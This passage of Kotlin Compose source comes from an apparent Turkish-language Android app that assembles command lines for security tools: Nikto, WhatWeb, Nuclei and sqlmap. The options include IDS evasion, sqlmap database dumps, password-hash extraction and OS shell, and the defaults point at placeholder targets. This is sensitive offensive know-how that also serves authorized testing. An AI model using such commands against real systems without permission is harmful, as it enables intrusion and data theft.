        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = pauseDelay,
                onValueChange = { pauseDelay = it },
                label = { Text("Gecikme sn (-Pause 1)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = maxTime,
                onValueChange = { maxTime = it },
                label = { Text("Azami Süre (-maxtime 1h)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "RAPOR FORMATI (-Format)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("htm" to "HTML (.htm)", "txt" to "Metin (.txt)", "csv" to "CSV (.csv)", "json" to "JSON (.json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (outputFormat != "none") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = outputFile,
                onValueChange = { outputFile = it },
                label = { Text("Rapor Dosyası Adı") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("nikto", "-h", host.trim())
        if (port.isNotBlank()) parts.addAll(listOf("-p", port.trim()))
        if (userAgent.isNotBlank()) parts.addAll(listOf("-useragent", "\"${userAgent.trim()}\""))
        if (useSsl) parts.add("-ssl")
        if (vhost.isNotBlank()) parts.addAll(listOf("-vhost", vhost.trim()))
        if (httpAuth.isNotBlank()) parts.addAll(listOf("-id", httpAuth.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-useproxy", proxyUrl.trim()))
        if (pauseDelay.isNotBlank()) parts.addAll(listOf("-Pause", pauseDelay.trim()))
        if (maxTime.isNotBlank()) parts.addAll(listOf("-maxtime", maxTime.trim()))
        if (noInteractive) parts.add("-nointeractive")

        val tuningCodes = buildString {
            if (tuneUpload) append("1")
            if (tuneMisconfig) append("2")
            if (tuneInfoLeak) append("3")
            if (tuneInjection) append("4")
            if (tuneRemoteFile) append("5")
            if (tuneDos) append("6")
            if (tuneCommandExec) append("8")
            if (tuneSqli) append("9")
            if (tuneAuthBypass) append("a")
            if (tuneSoftwareId) append("b")
        }
        if (tuningCodes.isNotBlank()) parts.addAll(listOf("-Tuning", tuningCodes))

        val evasionCodes = buildString {
            if (evadeRandomUri) append("1")
            if (evadeSelfRef) append("2")
            if (evadePrematureEnd) append("3")
            if (evadePrependLong) append("4")
            if (evadeTabSpace) append("6")
            if (evadeWindowsSlash) append("8")
        }
        if (evasionCodes.isNotBlank()) parts.addAll(listOf("-evasion", evasionCodes))

        if (outputFormat != "none") {
            val ext = if (outputFormat == "htm") "html" else outputFormat
            parts.addAll(listOf("-o", "${outputFile.trim()}.$ext", "-Format", outputFormat))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 10. WHATWEB
@Composable
fun WhatWebBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("http://10.10.10.100") }
    var isInputFile by remember { mutableStateOf(false) }
    var aggression by remember { mutableStateOf("3") }
    var plugins by remember { mutableStateOf("") }
    var userAgent by remember { mutableStateOf("") }
    var customHeader by remember { mutableStateOf("") }
    var cookie by remember { mutableStateOf("") }
    var maxThreads by remember { mutableStateOf("25") }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var verbose by remember { mutableStateOf(true) }
    var noErrors by remember { mutableStateOf(true) }
    var colorNever by remember { mutableStateOf(false) }
    var outputFormat by remember { mutableStateOf("json") }
    var outputFile by remember { mutableStateOf("whatweb_results") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Tek URL / IP", !isInputFile, modifier = Modifier.weight(1f)) { isInputFile = false }
            ToggleChip("Dosyadan Oku (-i)", isInputFile, modifier = Modifier.weight(1f)) { isInputFile = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isInputFile) "Hedefler Dosyası (-i targets.txt)" else "Hedef URL (http://...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AGRESİFLİK SEVİYESİ (-a)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("1" to "Pasif (1)", "3" to "Agresif (3)", "4" to "Ağır / Brute (4)").forEach { (lvl, lbl) ->
                val isSelected = aggression == lvl
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { aggression = lvl }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "EKLENTİ VE BAŞLIK AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        OutlinedTextField(
            value = plugins,
            onValueChange = { plugins = it },
            label = { Text("Özel Eklentiler (-p Apache,PHP,WordPress,jQuery)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customHeader,
                onValueChange = { customHeader = it },
                label = { Text("Özel Header (--header 'X: Y')") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = cookie,
                onValueChange = { cookie = it },
                label = { Text("Cookie (--cookie 'sess=1')") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AĞ VE PROXY AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = maxThreads,
                onValueChange = { maxThreads = it },
                label = { Text("İş Parçacığı (--max-threads)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = userAgent,
                onValueChange = { userAgent = it },
                label = { Text("User-Agent (--user-agent)") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy URL") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-v Detaylı Çıktı (Verbose)", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "--no-errors Hata Mesajlarını Gizle", checked = noErrors, onCheckedChange = { noErrors = it })
        ToggleOption(label = "--color=never Terminal Renklerini Kapat", checked = colorNever, onCheckedChange = { colorNever = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "RAPOR VE ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("json" to "JSON (--log-json)", "xml" to "XML (--log-xml)", "brief" to "Kısa (--log-brief)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("whatweb", "-a", aggression)
        if (plugins.isNotBlank()) parts.addAll(listOf("-p", plugins.trim()))
        if (userAgent.isNotBlank()) parts.addAll(listOf("--user-agent", "\"${userAgent.trim()}\""))
        if (customHeader.isNotBlank()) parts.addAll(listOf("--header", "\"${customHeader.trim()}\""))
        if (cookie.isNotBlank()) parts.addAll(listOf("--cookie", "\"${cookie.trim()}\""))
        if (maxThreads.isNotBlank()) parts.addAll(listOf("--max-threads", maxThreads.trim()))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("--proxy", proxyUrl.trim()))
        if (verbose) parts.add("-v")
        if (noErrors) parts.add("--no-errors")
        if (colorNever) parts.add("--color=never")

        when (outputFormat) {
            "json" -> parts.add("--log-json=${outputFile.trim()}.json")
            "xml" -> parts.add("--log-xml=${outputFile.trim()}.xml")
            "brief" -> parts.add("--log-brief=${outputFile.trim()}.txt")
        }

        if (isInputFile) {
            parts.addAll(listOf("-i", target.trim()))
        } else {
            parts.add(target.trim())
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// =============================================================
// PART 3: ZAFİYET TARAMA & WEB / API İSTİSMARI (10 ARAÇ)
// =============================================================

// 21. NUCLEI
@Composable
fun NucleiBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("https://target.com") }
    var isTargetList by remember { mutableStateOf(false) }
    var customTags by remember { mutableStateOf("cve,rce,sqli,lfi,ssrf,misconfig,takeover") }
    var customTemplatePath by remember { mutableStateOf("") }
    var rateLimit by remember { mutableStateOf("150") }
    var concurrency by remember { mutableStateOf("25") }
    var bulkSize by remember { mutableStateOf("25") }

    // Severities (Multi-select)
    var sevCritical by remember { mutableStateOf(true) }
    var sevHigh by remember { mutableStateOf(true) }
    var sevMedium by remember { mutableStateOf(false) }
    var sevLow by remember { mutableStateOf(false) }
    var sevInfo by remember { mutableStateOf(false) }

    // Modlar & Bayraklar
    var autoTech by remember { mutableStateOf(true) }
    var dastOnly by remember { mutableStateOf(false) }
    var headless by remember { mutableStateOf(false) }
    var newTemplates by remember { mutableStateOf(false) }
    var includeReqResp by remember { mutableStateOf(false) }
    var silent by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var customHeaders by remember { mutableStateOf("") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Tek Hedef URL (-u)", !isTargetList, modifier = Modifier.weight(1f)) { isTargetList = false }
            ToggleChip("Hedefler Listesi (-l)", isTargetList, modifier = Modifier.weight(1f)) { isTargetList = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isTargetList) "Hedefler Dosyası (urls.txt)" else "Hedef URL (https://target.com)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customTags,
            onValueChange = { customTags = it },
            label = { Text("Zafiyet Etiketleri (-tags cve,rce,sqli,lfi,ssrf..)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = customHeaders,
            onValueChange = { customHeaders = it },
            label = { Text("Özel HTTP Header (-H 'Authorization: Bearer...' - Opsiyonel)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "KRİTİKLİK DERECESİ (-s)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Critical", sevCritical, modifier = Modifier.weight(1f)) { sevCritical = !sevCritical }
            ToggleChip("High", sevHigh, modifier = Modifier.weight(1f)) { sevHigh = !sevHigh }
            ToggleChip("Medium", sevMedium, modifier = Modifier.weight(1f)) { sevMedium = !sevMedium }
            ToggleChip("Low", sevLow, modifier = Modifier.weight(1f)) { sevLow = !sevLow }
            ToggleChip("Info", sevInfo, modifier = Modifier.weight(1f)) { sevInfo = !sevInfo }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ŞABLON VE MOTOR MODLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-as Tespit Edilen Teknolojilere Göre Şablon Seç (Auto-detect)", checked = autoTech, onCheckedChange = { autoTech = it })
        ToggleOption(label = "-dast Yalnızca Dinamik Uygulama Güvenlik Şablonlarını Çalıştır", checked = dastOnly, onCheckedChange = { dastOnly = it })
        ToggleOption(label = "-headless Headless Chromium Tarayıcısı Gerektiren Şablonları Dahil Et", checked = headless, onCheckedChange = { headless = it })
        ToggleOption(label = "-nt Yalnızca Yeni Eklenen Şablonları Çalıştır", checked = newTemplates, onCheckedChange = { newTemplates = it })
        ToggleOption(label = "-irr Rapor Çıktısına İstek ve Yanıt Detaylarını Ekle", checked = includeReqResp, onCheckedChange = { includeReqResp = it })
        ToggleOption(label = "-silent Yalnızca Tespit Edilen Zafiyetleri Ekrana Bas", checked = silent, onCheckedChange = { silent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE AĞ YAPILANDIRMASI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate (-rl)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = concurrency,
                onValueChange = { concurrency = it },
                label = { Text("Concurrency (-c)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = bulkSize,
                onValueChange = { bulkSize = it },
                label = { Text("Bulk Size (-bs)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Proxy Kullan (-proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }
        OutlinedTextField(
            value = customTemplatePath,
            onValueChange = { customTemplatePath = it },
            label = { Text("Özel Şablon / Dizin Yolu (-t cves/..)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "jsonl" to "JSONL (-j)", "markdown" to "Markdown (-me)").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("nuclei")
        if (isTargetList) parts.addAll(listOf("-l", target.trim())) else parts.addAll(listOf("-u", target.trim()))
        if (customTags.isNotBlank()) parts.addAll(listOf("-tags", customTags.trim()))

        val sevs = mutableListOf<String>()
        if (sevCritical) sevs.add("critical")
        if (sevHigh) sevs.add("high")
        if (sevMedium) sevs.add("medium")
        if (sevLow) sevs.add("low")
        if (sevInfo) sevs.add("info")
        if (sevs.isNotEmpty()) parts.addAll(listOf("-s", sevs.joinToString(",")))

        if (autoTech) parts.add("-as")
        if (dastOnly) parts.add("-dast")
        if (headless) parts.add("-headless")
        if (newTemplates) parts.add("-nt")
        if (includeReqResp) parts.add("-irr")
        if (silent) parts.add("-silent")
        if (customTemplatePath.isNotBlank()) parts.addAll(listOf("-t", customTemplatePath.trim()))
        if (customHeaders.isNotBlank()) parts.addAll(listOf("-H", "\"${customHeaders.trim()}\""))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-proxy", proxyUrl.trim()))

        parts.addAll(listOf("-rl", rateLimit.trim(), "-c", concurrency.trim(), "-bulk-size", bulkSize.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "nuclei_findings.txt"))
            "jsonl" -> parts.addAll(listOf("-j", "-o", "nuclei_findings.jsonl"))
            "markdown" -> parts.addAll(listOf("-me", "nuclei_report/"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 22. SQLMAP
@Composable
fun SqlmapBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("http://10.10.10.100/vuln.php?id=1") }
    var isRequestFile by remember { mutableStateOf(false) }
    var testParam by remember { mutableStateOf("") }
    var action by remember { mutableStateOf("--dbs") }
    var dbms by remember { mutableStateOf("all") }
    var dbName by remember { mutableStateOf("") }
    var tableName by remember { mutableStateOf("") }
    var columnName by remember { mutableStateOf("") }
    var riskLevel by remember { mutableStateOf("3") }
    var level by remember { mutableStateOf("3") }
    var threads by remember { mutableStateOf("5") }

    // Teknikler (BEUSTQ)
    var techB by remember { mutableStateOf(true) } // Boolean
    var techE by remember { mutableStateOf(true) } // Error
    var techU by remember { mutableStateOf(true) } // Union
    var techS by remember { mutableStateOf(true) } // Stacked
    var techT by remember { mutableStateOf(true) } // Time
    var techQ by remember { mutableStateOf(false) } // Inline

    // Evasion & Tamper
    var tamperScript by remember { mutableStateOf("space2comment") }
    var enableTamper by remember { mutableStateOf(false) }
    var batchMode by remember { mutableStateOf(true) }
    var flushSession by remember { mutableStateOf(false) }
    var randomAgent by remember { mutableStateOf(true) }
    var hexEncoding by remember { mutableStateOf(false) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("URL (-u)", !isRequestFile, modifier = Modifier.weight(1f)) { isRequestFile = false }
            ToggleChip("İstek Dosyası (-r)", isRequestFile, modifier = Modifier.weight(1f)) { isRequestFile = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isRequestFile) "Raw HTTP İstek Dosyası (request.txt)" else "Hedef URL (-u http://.../page.php?id=1)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = testParam,
                onValueChange = { testParam = it },
                label = { Text("Hedef Parametre (-p id: opsiyonel)") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (--threads)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "VERİ ÇEKME & İSTİSMAR HEDEFİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("--dbs" to "DB'ler", "--tables" to "Tablolar", "--columns" to "Kolonlar", "--dump" to "Dump", "--os-shell" to "OS Shell").forEach { (act, lbl) ->
                val isSelected = action == act
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { action = act }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("--current-user" to "User", "--current-db" to "Aktif DB", "--is-dba" to "DBA?", "--sql-shell" to "SQL Shell", "--passwords" to "Hashler").forEach { (act, lbl) ->
                val isSelected = action == act
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { action = act }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        if (action == "--tables" || action == "--columns" || action == "--dump") {
            Spacer(modifier = Modifier.height(6.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = dbName,
                    onValueChange = { dbName = it },
                    label = { Text("DB Adı (-D)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                if (action == "--columns" || action == "--dump") {
                    OutlinedTextField(
                        value = tableName,
                        onValueChange = { tableName = it },
                        label = { Text("Tablo (-T)") },
                        modifier = Modifier.weight(1f),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )
                }
            }
            if (action == "--columns" || action == "--dump") {
                Spacer(modifier = Modifier.height(6.dp))
                OutlinedTextField(
                    value = columnName,
                    onValueChange = { columnName = it },
                    label = { Text("Hedef Kolonlar (-C id,user,pass - Opsiyonel)") },
                    modifier = Modifier.fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = dbms,
            onValueChange = { dbms = it },
            label = { Text("Hedef Veritabanı Türü (--dbms: all, MySQL, PostgreSQL, MSSQL, Oracle)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ENJEKSİYON TEKNİKLERİ (--technique)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("B (Boolean)", techB, modifier = Modifier.weight(1f)) { techB = !techB }
            ToggleChip("E (Error)", techE, modifier = Modifier.weight(1f)) { techE = !techE }
            ToggleChip("U (Union)", techU, modifier = Modifier.weight(1f)) { techU = !techU }
            ToggleChip("S (Stacked)", techS, modifier = Modifier.weight(1f)) { techS = !techS }
            ToggleChip("T (Time)", techT, modifier = Modifier.weight(1f)) { techT = !techT }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "RİSK, SEVİYE VE ATLATMA (EVASION)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
